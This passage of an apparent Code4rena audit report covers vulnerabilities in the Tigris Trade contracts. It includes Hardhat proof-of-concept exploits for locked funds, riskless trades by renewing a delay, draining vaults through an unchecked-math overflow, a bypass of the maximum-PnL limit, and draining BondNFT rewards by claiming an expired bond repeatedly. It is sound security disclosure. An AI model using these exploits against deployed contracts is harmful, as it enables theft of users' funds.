<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105>

### Impact

The `Lock` contract (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L10>) allows end-users to interact with bonds.

There are two functions that allow to lock some amount of assets. The first function is `Lock.lock` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L61-L76>) which creates a new bond. The second function is `Lock.extendLock` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L84-L92>). This function extends the lock for some `_period` and / or increases the locked amount by some `_amount`.

The issue is that the `Lock.extendLock` function does not increase the value in `totalLocked[_asset]`. This however is necessary because `totalLocked[_asset]` is reduced when `Lock.release` (<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Lock.sol#L98-L105>) is called.

Therefore only the amount of assets deposited via `Lock.lock` can be released again. The amount of assets deposited using `Lock.extendLock` can never be released again because reducing `totalLocked[_asset]` will cause a revert due to underflow.

So the amount of assets deposited using `Lock.extendLock` is lost.

### Proof of Concept

1.  User A calls `Lock.lock` to lock a certain `_amount` (amount1) of `_asset` for a certain `_period`.
2.  User A calls then `Lock.extendLock` and increases the locked amount of the bond by some amount2
3.  User A waits until the bond has expired
4.  User A calls `Lock.release`. This function calculates `totalLocked[asset] -= lockAmount;`. Which will cause a revert because the value of `totalLocked[asset]` is only amount1

You can add the following test to the `Bonds` test in `Bonds.js`:

```javascript
describe(""ReleaseUnderflow"", function () {
    it(""release can cause underflow"", async function () {
        await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(""110""));
        // Lock 100 for 9 days
        await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(""100""), 9);

        await bond.connect(owner).setManager(lock.address);

        await stabletoken.connect(user).approve(lock.address, ethers.utils.parseEther(""10""));

        // Lock another 10
        await lock.connect(user).extendLock(1, ethers.utils.parseEther(""10""), 0);

        await network.provider.send(""evm_increaseTime"", [864000]); // Skip 10 days
        await network.provider.send(""evm_mine"");

        // Try to release 110 after bond has expired -> Underflow
        await lock.connect(user).release(1);
    });
});
```

Run it with `npx hardhat test --grep ""release can cause underflow""`.\
You can see that it fails because it causes an underflow.

### Tools Used

VS Code

### Recommended Mitigation Steps

Add `totalLocked[_asset] += amount` to the `Lock.extendLock` function.







***"
192.md,Riskless trades due to delay check,high,"*Submitted by [Bobface](https://github.com/code-423n4/2022-12-tigris-findings/issues/67)*

`Trading.limitClose()` uses `_checkDelay()`. This allows for riskless trades, by capturing price rises through increasing the stop-loss, while preventing the underwater position to be closed in case of the price dropping by continuously increasing the delay.

### Detailed description

A malicious trader can exploit the `Trading` contract to achieve riskless trades. In the worst-case scenario, the trader can always close the trade break-even, while in a good scenario the trader captures all upside price movement.

The exploit is based on three principles:

1.  The stop-loss of a position can be updated without any delay checks, due to `_checkDelay()` not being called in `updateTpSl()`
2.  Positions can only be closed by MEV bots or other third parties after the block delay has been passed due to `limitClose` calling `_checkDelay()`
3.  The block delay can be continuously renewed for a negligible cost

**Based on these three principles, the following method can be used to perform riskless trades:**
Assuming a current market price of 1,000 DAI, begin by opening a long limit order through `initiateLimitOrder()` at the current market price of 1,000 DAI and stop-loss at the exact market price of 1,000 DAI. Then immediately execute the limit order through `executeLimitOrder`.

After the block delay has passed, MEV bots or other third parties interested in receiving a percentage reward for closing the order would call `limitClose`. However, we can prevent them from doing so by continuously calling `addToPosition` with 1 wei when the block delay comes close to running out *\[1]*, which will renew the delay and thus stops `limitClose` from being called.

While the trader keeps renewing the delay to stop his position from being closed, he watches the price development:

*   If the price goes **down**, the trader will not make any loss, since he still has his original stop-loss set. He just has to make sure that the price does not drop too far to be liquidated through `liquidatePosition()`. If the price comes close to the liquidation zone, he stops renewing the delay and closes the position break-even for the initial stop-loss price even though the price is down significantly further. He can also choose to do that at any other point in time if he decides the price is unlikely to move upward again.
*   If the price goes **up**, the trader calls `updateTpSl()` to lock in the increased price. For example, if the price moves from 1,000 DAI to 2,000 DAI, he calls `updateTpSl()` with 2,000 DAI as stop-loss. Even if the price drops below 2,000 DAI again, the stop-loss is stored. This function can be called while the delay is still in place because there is no call to `_checkDelay()`.

The trader keeps calling `updateTpSl()` when the price reaches a new high since he opened the position initially to capture all upside movement. When he decides that the price has moved high enough, he finally lets the delay run out and calls `limitClose()` to close the order at the peak stop-loss.

*Notes*
*\[1]*: Tigris Trade also plans to use L2s such as Arbitrum where there is one block per transaction. This could bring up the false impression that the trader would have to make lots of calls to `addToPosition` after every few transactions on the chain. However, `block.number`, which is used by the contract, actually returns the L1 block number and not the L2 block number.

### Recommended Mitigation Steps

The core issue is that the position cannot be closed even if it is below the stop-loss due to constantly renewing the delay. The delay checking in `limitClose()` should be modified to also consider whether the position is below the stop-loss.

### Proof of Concept

Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:

```javascript
describe(""PoC"", function () {
    it.only(""PoC"", async function () {
      // Setup token balances and approvals
      const mockDAI = await ethers.getContractAt(""MockERC20"", MockDAI.address)
      await mockDAI.connect(owner).transfer(user.address, parseEther(""10000""))
      await mockDAI.connect(owner).transfer(stablevault.address, parseEther(""100000""))
      await mockDAI.connect(user).approve(trading.address, parseEther(""10000""))
      const daiAtBeginning = await mockDAI.balanceOf(user.address)
      const permitData = [
        ""0"",
        ""0"",
        ""0"",
        ""0x0000000000000000000000000000000000000000000000000000000000000000"",
        ""0x0000000000000000000000000000000000000000000000000000000000000000"",
        false
      ]

      // Setup block delay to 5 blocks
      const blockDelay = 5;
      await trading.connect(owner).setBlockDelay(blockDelay)




      // ============================================================== //
      // =================== Create the limit order =================== //
      // ============================================================== //
      const tradeInfo = [
        parseEther(""9000""),       // margin amount
        MockDAI.address,          // margin asset
        StableVault.address,      // stable vault
        parseEther(""2""),          // leverage
        0,                        // asset id
        true,                     // direction (long)
        parseEther(""0""),          // take profit price
        parseEther(""1000""),       // stop loss price
        ethers.constants.HashZero // referral
      ];

      // Create the order
      await trading.connect(user).initiateLimitOrder(
        tradeInfo,            // trade info
        1,                    // order type (limit)
        parseEther(""1000""),   // price
        permitData,           // permit
        user.address          // trader
      )



      // ============================================================== //
      // =================== Execute the limit order ================== //
      // ============================================================== //

      // Wait for some blocks to pass the delay
      await network.provider.send(""evm_increaseTime"", [10])
      for (let n = 0; n < blockDelay; n++) {
        await network.provider.send(""evm_mine"")
      }

      // Create the price data (the price hasn't changed)
      let priceData = [
        node.address,                                   // provider
        0,                                              // asset id
        parseEther(""1000""),                             // price
        10000000,                                       // spread (0.1%)
        (await ethers.provider.getBlock()).timestamp,   // timestamp
        false                                           // is closed
      ]

      // Sign the price data
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      )

      // Execute the limit order
      await trading.connect(user).executeLimitOrder(1, priceData, sig);






      // ============================================================== //
      // ================== Block bots from closing =================== //
      // ============================================================== //

      for (let i = 0; i < 5; i++) {

        /*
          This loop demonstrates blocking bots from closing the position even if the price falls below the stop loss.
          We constantly add 1 wei to the position when the delay is close to running out.
          This won't change anything about our position, but it will reset the delay timer,
          stopping bots from calling `limitClose()`. 

          This means that if the price drops, we can keep our position open with the higher stop loss, avoiding any losses.
          And if the price rises, we can push the stop loss higher to keep profits.

          The loop runs five times just to demonstrate. In reality, this could be done as long as needed.
        */


        // Blocks advanced to one block before the delay would pass
        await network.provider.send(""evm_increaseTime"", [10])
        for (let n = 0; n < blockDelay - 1; n++) {
          await network.provider.send(""evm_mine"")
        }




        // ============================================================== //
        // =========== Add 1 wei to position (price is down)  =========== //
        // ============================================================== //

        // Increase delay by calling addToPosition with 1 wei
        // Create the price data
        priceData = [
          node.address,                                   // provider
          0,                                              // asset id
          parseEther(""900""),                              // price
          10000000,                                       // spread (0.1%)
          (await ethers.provider.getBlock()).timestamp,   // timestamp
          false                                           // is closed
        ]

        // Sign the price data - 
        message = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
          )
        );
        sig = await node.signMessage(
          Buffer.from(message.substring(2), 'hex')
        )

        // Add to position
        await trading.connect(user).addToPosition(
          1,
          ""1"",
          priceData,
          sig,
          stablevault.address,
          MockDAI.address,
          permitData,
          user.address,
        )



        // ============================================================== //
        // ====================== Bots cannot close ===================== //
        // ============================================================== //

        // Bots cannot close the position even if the price is down below the stop loss
        await expect(trading.connect(user).limitClose(
          1,          // id
          false,      // take profit
          priceData,  // price data
          sig,        // signature
        )).to.be.revertedWith(""0"") // checkDelay

        // They can also not liquidate the position because the price is not down enough
        // If the price falls close to the liquidation zone, we can add more margin or simply close
        // the position, netting us the stop-loss price.
        await expect(trading.connect(user).liquidatePosition(
          1,          // id
          priceData,  // price data
          sig,        // signature
        )).to.be.reverted




        // ============================================================== //
        // =============== Increase SL when price is up  ================ //
        // ============================================================== //

        // Sign the price data (price has 5x'ed from initial price)
        priceData = [
          node.address,                                   // provider
          0,                                              // asset id
          parseEther(""5000""),                             // price
          10000000,                                       // spread (0.1%)
          (await ethers.provider.getBlock()).timestamp,   // timestamp
          false                                           // is closed
        ]
        message = ethers.utils.keccak256(
          ethers.utils.defaultAbiCoder.encode(
            ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
            [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
          )
        );
        sig = await node.signMessage(
          Buffer.from(message.substring(2), 'hex')
        )

        // Update stop loss right at the current price
        await trading.connect(user).updateTpSl(
          false,                // type (sl)
          1,                    // id
          parseEther(""5000""),   // sl price
          priceData,            // price data
          sig,                  // signature
          user.address,        // trader
        )
      }





      // ============================================================== //
      // ======================== Close order  ======================== //
      // ============================================================== //

      // When we are happy with the profit, we stop increasing the delay and close the position

      // Wait for some blocks to pass the delay
      await network.provider.send(""evm_increaseTime"", [10])
      for (let n = 0; n < blockDelay; n++) {
        await network.provider.send(""evm_mine"")
      }

      // Close order
      await trading.connect(user).limitClose(
        1,          // id
        false,      // take profit
        priceData,  // price data
        sig,        // signature
      )

      // Withdraw to DAI
      const amount = await stabletoken.balanceOf(user.address)
      await stablevault.connect(user).withdraw(MockDAI.address, amount)

      // Print results
      const daiAtEnd = await mockDAI.balanceOf(user.address)
      const tenPow18 = ""1000000000000000000""
      const diff = (daiAtEnd - daiAtBeginning).toString() / tenPow18
      console.log(`Profit: ${diff} DAI`)
    })
})
```

 





***"
192.md,Certain fee configuration enables vaults to be drained,high,"*Submitted by [Bobface](https://github.com/code-423n4/2022-12-tigris-findings/issues/86)*

An overflow in `TradingLibrary.pnl()` enables all funds from the vault contracts to be drained given a certain fee configuration is present.

### Detailed exploit process description

When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in an `unchecked` block. Setting this value specifically to attack the vault leads to the `Trading` contract minting a huge (in the example below `10^36`) Tigris tokens, which can then be given to the vault to withdraw assets.

The exploiter starts by setting himself as referrer, in order to later receive the referrer fees.

The next step is to open a short position at the current market price by calling `initiateLimitOrder()`. Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be `115792089237316195423570985008687907854269984665640564039467` for this specific market price, leverage and margin.

The order is then immediately executed through `executeLimitOrder()`.

The final step is to close the order through `limitClose()`, which will then mint over `10^36` Tigris tokens to the attacker.

### Detailed bug description

The bug takes place in `TradingLibrary.pnl()`, line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as `_currentPrice` and the order's original opening price is passed as `_price`. The take-profit has been specifically calculated so that `1e18 * _currentPrice / _price - 1e18` results in `0`, meaning `_payout = _margin` (`accInterest` is negligible for this PoC).
Line 48 then calculates the position size. Margin and leverage have been chosen so that `_initPositionSize * _currentPrice` does not overflow, resulting in a huge `_positionSize` which is returned from the function.

Later, `Trading._handleCloseFees()` is called, under the condition that `_payout > 0`, which is why the overflow had to be calculated so precisely, as to not subtract from the `_payout` but still create a large `_positionSize`. `_positionSize` is passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to be `daoFees = 2*referralFees` -- not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the huge `referralFees` are directly minted and not included in the calculation in line 805.

### Recommended Mitigation Steps

The core issue is that the arithmetic in `TradingLibrary.pnl()` overflows. I recommend removing the `unchecked` block.

### Proof of Concept

Insert the following code as test into `test/07.Trading.js` and run it with `npx hardhat test test/07.Trading.js`:

```javascript
describe(""PoC"", function () {
    it.only(""PoC"", async function () {
      // Setup token balances and approvals
      const mockDAI = await ethers.getContractAt(""MockERC20"", MockDAI.address)
      await mockDAI.connect(owner).transfer(user.address, parseEther(""10000""))
      await mockDAI.connect(user).approve(trading.address, parseEther(""10000""))
      const permitData = [
        ""0"",
        ""0"",
        ""0"",
        ""0x0000000000000000000000000000000000000000000000000000000000000000"",
        ""0x0000000000000000000000000000000000000000000000000000000000000000"",
        false
      ]

      // Create referral code
      await referrals.connect(user).createReferralCode(ethers.constants.HashZero)

      // Set the fees
      await trading.connect(owner).setFees(
        false,        // close
        ""200000000"",  // dao  
        ""0"",          // burn
        ""100000000"",  // referral
        ""0"",          // bot
        ""0"",          // percent
      )


      // ============================================================== //
      // =================== Create the limit order =================== //
      // ============================================================== //
      const tradeInfo = [
        parseEther(""1""),          // margin amount
        MockDAI.address,          // margin asset
        StableVault.address,      // stable vault
        parseEther(""2""),          // leverage
        0,                        // asset id
        false,                    // direction (short)
        ""115792089237316195423570985008687907854269984665640564039467"",          // take profit price
        parseEther(""0""),       // stop loss price
        ethers.constants.HashZero // referral (ourself)
      ];

      // Create the order
      await trading.connect(user).initiateLimitOrder(
        tradeInfo,            // trade info
        1,                    // order type (limit)
        parseEther(""1000""),   // price
        permitData,           // permit
        user.address          // trader
      )


      // ============================================================== //
      // =================== Execute the limit order ================== //
      // ============================================================== //

      // Wait for some blocks to pass the delay
      await network.provider.send(""evm_increaseTime"", [10])
      await network.provider.send(""evm_mine"")

      // Create the price data
      let priceData = [
        node.address,                                   // provider
        0,                                              // asset id
        parseEther(""1000""),                             // price
        10000000,                                       // spread (0.1%)
        (await ethers.provider.getBlock()).timestamp,   // timestamp
        false                                           // is closed
      ]

      // Sign the price data
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [priceData[0], priceData[1], priceData[2], priceData[3], priceData[4], priceData[5]]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      )

      // Execute the limit order
      await trading.connect(user).executeLimitOrder(1, priceData, sig);





      // ============================================================== //
      // ======================== Close order  ======================== //
      // ============================================================== //

      // Wait for some blocks to pass the delay
      await network.provider.send(""evm_increaseTime"", [10])
      await network.provider.send(""evm_mine"")

      // Close order
      await trading.connect(user).limitClose(
        1,          // id
        true,       // take profit
        priceData,  // price data
        sig,        // signature
      )

      // Print results
      const amount = await stabletoken.balanceOf(user.address)
      const tenPow18 = ""1000000000000000000""
      console.log(`StableToken balance at end: ${(amount / tenPow18).toString()}`)
    })
})
```



 > The Warden has shown how, by leveraging `unchecked` math and using injected-inputs, it's possible to effectively mint an infinite amount of Stable Tokens.
> 
> Mitigation will require ensuring that user provided inputs do not allow for overflows.




***"
192.md,Bypass the maximum PnL check to take extra profit,high,"*Submitted by [KingNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/111)*

To protect the fund of vault, the protocol has a security mechanism which limits:

    Maximum PnL is +500%. 

source: <https://docs.tigris.trade/protocol/trading-and-fees#limitations>

But the implementation is missing to check this limitation while `addToPosition()`, an attacker can exploit it to get more profit than expected.

### Proof of Concept

The following test case shows both normal case and the exploit scenario.

In the normal case,  a 990 USD margin, gets back a 500% of 4950 USD payout, and the profit is 3960 USD.

In the exploit case, the attack will get an extra 2600+ USD profit than the normal case.

```
const { expect } = require(""chai"");
const { deployments, ethers, waffle } = require(""hardhat"");
const { parseEther, formatEther } = ethers.utils;
const { signERC2612Permit } = require('eth-permit');
const exp = require(""constants"");

describe(""Design Specification: Maximum PnL is +500%"", function () {

  let owner;
  let node;
  let user;
  let node2;
  let node3;
  let proxy;

  let Trading;
  let trading;

  let TradingExtension;
  let tradingExtension;

  let TradingLibrary;
  let tradinglibrary;

  let StableToken;
  let stabletoken;

  let StableVault;
  let stablevault;

  let position;

  let pairscontract;
  let referrals;

  let permitSig;
  let permitSigUsdc;

  let MockDAI;
  let mockdai;
  let MockUSDC;
  let mockusdc;

  let badstablevault;

  let chainlink;

  beforeEach(async function () {
    await deployments.fixture(['test']);
    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();
    StableToken = await deployments.get(""StableToken"");
    stabletoken = await ethers.getContractAt(""StableToken"", StableToken.address);
    Trading = await deployments.get(""Trading"");
    trading = await ethers.getContractAt(""Trading"", Trading.address);
    await trading.connect(owner).setMaxWinPercent(5e10);
    TradingExtension = await deployments.get(""TradingExtension"");
    tradingExtension = await ethers.getContractAt(""TradingExtension"", TradingExtension.address);
    const Position = await deployments.get(""Position"");
    position = await ethers.getContractAt(""Position"", Position.address);
    MockDAI = await deployments.get(""MockDAI"");
    mockdai = await ethers.getContractAt(""MockERC20"", MockDAI.address);
    MockUSDC = await deployments.get(""MockUSDC"");
    mockusdc = await ethers.getContractAt(""MockERC20"", MockUSDC.address);
    const PairsContract = await deployments.get(""PairsContract"");
    pairscontract = await ethers.getContractAt(""PairsContract"", PairsContract.address);
    const Referrals = await deployments.get(""Referrals"");
    referrals = await ethers.getContractAt(""Referrals"", Referrals.address);
    StableVault = await deployments.get(""StableVault"");
    stablevault = await ethers.getContractAt(""StableVault"", StableVault.address);
    await stablevault.connect(owner).listToken(MockDAI.address);
    await stablevault.connect(owner).listToken(MockUSDC.address);
    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);
    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(""1""));
    await tradingExtension.connect(owner).setNode(node.address, true);
    await tradingExtension.connect(owner).setNode(node2.address, true);
    await tradingExtension.connect(owner).setNode(node3.address, true);
    await network.provider.send(""evm_setNextBlockTimestamp"", [2000000000]);
    await network.provider.send(""evm_mine"");
    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);
    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);

    const BadStableVault = await ethers.getContractFactory(""BadStableVault"");
    badstablevault = await BadStableVault.deploy(StableToken.address);

    const ChainlinkContract = await ethers.getContractFactory(""MockChainlinkFeed"");
    chainlink = await ChainlinkContract.deploy();

    TradingLibrary = await deployments.get(""TradingLibrary"");
    tradinglibrary = await ethers.getContractAt(""TradingLibrary"", TradingLibrary.address);
    await trading.connect(owner).setLimitOrderPriceRange(1e10);
  });


  describe(""Bypass the maximum PnL check to take extra profit"", function () {
    let orderId;
    let closePriceData;
    let closeSig;
    let initPrice = parseEther(""1000"");
    let closePrice = parseEther(""2000"");
    beforeEach(async function () {
      let maxWin = await trading.maxWinPercent();
      expect(maxWin.eq(5e10)).to.equal(true);

      let TradeInfo = [parseEther(""1000""), MockDAI.address, StableVault.address, parseEther(""10""), 1, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, initPrice, 0, 2000000000, false]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      );
      
      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
      orderId = await position.getCount();
      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
      expect(await position.assetOpenPositionsLength(1)).to.equal(1);
      let trade = await position.trades(orderId);
      let marginAfterFee = trade.margin;
      expect(marginAfterFee.eq(parseEther('990'))).to.equal(true);

      // Some time later
      await network.provider.send(""evm_setNextBlockTimestamp"", [2000001000]);
      await network.provider.send(""evm_mine"");
      
      // Now the price is doubled, profit = margin * leverage = $990 * 10 = $9900
      closePriceData = [node.address, 1, closePrice, 0, 2000001000, false];
      let closeMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, closePrice, 0, 2000001000, false]
        )
      );
      closeSig = await node.signMessage(
        Buffer.from(closeMessage.substring(2), 'hex')
      );

    });

    it.only(""All profit is $9900, close the order normally, only get $3960 profit"", async function () {
      let balanceBefore = await stabletoken.balanceOf(owner.address);
      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
      let balanceAfter = await stabletoken.balanceOf(owner.address);
      let marginAfterFee = parseEther(""990"");
      let payout = balanceAfter.sub(balanceBefore);
      expect(payout.eq(parseEther(""4950""))).to.be.true;

      let profit = balanceAfter.sub(balanceBefore).sub(marginAfterFee);
      expect(profit.eq(parseEther(""3960""))).to.be.true;

    });

    it.only(""All profit is $9900, bypass the PnL check to take extra $2600 profit"", async function () {
      // We increase the possition first rather than closing the profit order directly
      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
      let extraMargin = parseEther(""1000"");
      await trading.connect(owner).addToPosition(orderId, extraMargin, closePriceData, closeSig, StableVault.address, MockDAI.address, PermitData, owner.address);

      // 60 secs later
      await network.provider.send(""evm_setNextBlockTimestamp"", [2000001060]);
      await network.provider.send(""evm_mine"");
  
      // Now we close the order to take all profit
      closePriceData = [node.address, 1, closePrice, 0, 2000001060, false];
      let closeMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, closePrice, 0, 2000001060, false]
        )
      );
      closeSig = await node.signMessage(
        Buffer.from(closeMessage.substring(2), 'hex')
      );

      let balanceBefore = await stabletoken.balanceOf(owner.address);
      await trading.connect(owner).initiateCloseOrder(orderId, 1e10, closePriceData, closeSig, StableVault.address, StableToken.address, owner.address);
      let balanceAfter = await stabletoken.balanceOf(owner.address);
      let marginAfterFee = parseEther(""990"").add(extraMargin.mul(990).div(1000));
      let originalProfit = parseEther(""3960"");
      let extraProfit = balanceAfter.sub(balanceBefore).sub(marginAfterFee).sub(originalProfit);
      expect(extraProfit.gt(parseEther('2600'))).to.be.true;
    });

  });
});


```

The test result

     Design Specification: Maximum PnL is +500%
        Bypass the maximum PnL check to take extra profit
          √ All profit is $9900, close the order normally, only get $3960 profit
          √ All profit is $9900, bypass the PnL check to take extra $2600 profit

### Tools Used

VS Code

### Recommended Mitigation Steps

Add a check for `addToPosition()` function, revert if PnL >= 500%, enforce users to close the order to take a limited profit.




 >
> Implemented something similar to this report's recommended mitigation, where if PnL is >= maxPnl%-100%, then addToPosition, addMargin and removeMargin revert.



***"
192.md,Malicious user can steal all assets in BondNFT,high,"*Submitted by [hihen](https://github.com/code-423n4/2022-12-tigris-findings/issues/170), also found by [hansfriese](https://github.com/code-423n4/2022-12-tigris-findings/issues/503), [unforgiven](https://github.com/code-423n4/2022-12-tigris-findings/issues/423), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/398), [rvierdiiev](https://github.com/code-423n4/2022-12-tigris-findings/issues/182), and [HollaDieWaldfee](https://github.com/code-423n4/2022-12-tigris-findings/issues/68)*

Malicious user can drain all assets in BondNFT, and other users will lose their rewards.

### Proof of Concept

When calling [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187) for an expired bond, it will recalculate `accRewardsPerShare`. This is because the reward after the `expireEpoch` does not belong to that expired bond and needs to be redistributed to all other bonds.

```solidity
  if (bond.expired) {
      uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);
      if (totalShares[bond.asset] > 0) {
          accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];
      }
  }
```

In the current implementation of [BondNFT.claim()](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L168-L187), it can be called repeatedly as long as the expired bond is not released.

According to the formula in the above code, we can find that although each subsequent `claim()` of the expired bond will transfer 0 reward, the `accRewardsPerShare` will be updated cumulatively.
Thus, the pending rewards of all other users will increase every time the expired bond is `claim()`ed.

A malicious user can exploit this vulnerability to steal all assets in BondNFT contract:

1.  Create two bonds (B1, B2) with different `expireEpoch`
2.  At some time after B1 has expired (B2 has not), keep calling [`Lock.claim(B1)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to increase rewards of B2 continuously, until the pending rewards of B2 approaches the total amount of asset in the contract.
3.  Call [`Lock.claim(B2)`](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Lock.sol#L34) to claim all pending rewards of B2.

An example of such an attack:

```javascript
diff --git a/test/09.Bonds.js b/test/09.Bonds.js
index 16c3ff5..7c445c3 100644
--- a/test/09.Bonds.js
+++ b/test/09.Bonds.js
@@ -245,7 +245,90 @@ describe(""Bonds"", function () {
       await lock.connect(user).release(2);
       expect(await bond.pending(1)).to.be.equals(""999999999999999999725""); // Negligable difference from 1000e18 due to solidity division
     });
+
+    it.only(""Drain BondNFT rewards"", async function () {
+      const getState = async () => {
+        const balHacker= await stabletoken.balanceOf(hacker.address);
+        const balLock = await stabletoken.balanceOf(lock.address);
+        const balBond = await stabletoken.balanceOf(bond.address);
+        const [pending1, pending2, pending3] = [await bond.pending(1), await bond.pending(2), await bond.pending(3)];
+        return { hacker: balHacker, lock: balLock, bond: balBond, pending1, pending2, pending3};
+      };
+      const parseEther = (v) => ethers.utils.parseEther(v.toString());
+      const gwei = parseEther(1).div(1e9);
+
+      // prepare tokens
+      const TotalRewards = parseEther(8000);
+      await stabletoken.connect(owner).mintFor(owner.address, TotalRewards);
+      await stabletoken.connect(owner).mintFor(user.address, parseEther(1000));
+      const hacker = rndAddress;
+      await stabletoken.connect(owner).mintFor(hacker.address, parseEther(2000+700));
+      await stabletoken.connect(hacker).approve(Lock.address, parseEther(2000));
+
+      // bond1 - user
+      await lock.connect(user).lock(StableToken.address, parseEther(1000), 100);
+      await bond.distribute(stabletoken.address, parseEther(3800));
+      expect(await bond.pending(1)).to.be.closeTo(parseEther(3800), gwei);
+      // Skip some time
+      await network.provider.send(""evm_increaseTime"", [20*86400]);
+      await network.provider.send(""evm_mine"");
+
+      // bond2 - hacker
+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 10);
+      // bond3 - hacker
+      await lock.connect(hacker).lock(StableToken.address, parseEther(1000), 100);
+
+      await bond.distribute(stabletoken.address, parseEther(2100));
+
+      // Skip 10+ days, bond2 is expired
+      await network.provider.send(""evm_increaseTime"", [13*86400]);
+      await network.provider.send(""evm_mine"");
+      await bond.distribute(stabletoken.address, parseEther(2100));
+
+      // check balances before hack
+      let st = await getState();
+      expect(st.bond).to.be.equals(TotalRewards);
+      expect(st.lock).to.be.equals(parseEther(3000));
+      expect(st.hacker).to.be.equals(parseEther(0+700));
+      expect(st.pending1).to.be.closeTo(parseEther(3800+1000+1000), gwei);
+      expect(st.pending2).to.be.closeTo(parseEther(100), gwei);
+      expect(st.pending3).to.be.closeTo(parseEther(1000+1000), gwei);
+
+      // first claim of expired bond2
+      await lock.connect(hacker).claim(2);
+      st = await getState();
+      expect(st.bond).to.be.closeTo(TotalRewards.sub(parseEther(100)), gwei);
+      expect(st.hacker).to.be.closeTo(parseEther(100+700), gwei);
+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));
+      expect(st.pending2).to.be.eq(parseEther(0));
+      expect(st.pending3).to.be.gt(parseEther(1000+1000));
+
+      // hack
+      const remainReward = st.bond;
+      let pending3 = st.pending3;
+      let i = 0;
+      for (; remainReward.gt(pending3); i++) {
+        // claim expired bond2 repeatedly
+        await lock.connect(hacker).claim(2);
+        // pending3 keeps increasing
+        pending3 = await bond.pending(3);
+      }
+      console.log(`claim count: ${i}\nremain: ${ethers.utils.formatEther(remainReward)}\npending3: ${ethers.utils.formatEther(pending3)}\n`);
+
+      // send diff, then drain rewards in bond
+      await stabletoken.connect(hacker).transfer(bond.address, pending3.sub(remainReward));
+      await lock.connect(hacker).claim(3);
+      st = await getState();
+      // !! bond is drained !!
+      expect(st.bond).to.be.eq(0);
+      // !! hacker gets all rewards !!
+      expect(st.hacker).to.be.eq(TotalRewards.add(parseEther(700)));
+      expect(st.pending1).to.be.gt(parseEther(3800+1000+1000));
+      expect(st.pending2).to.be.eq(0);
+      expect(st.pending3).to.be.eq(0);
+    });
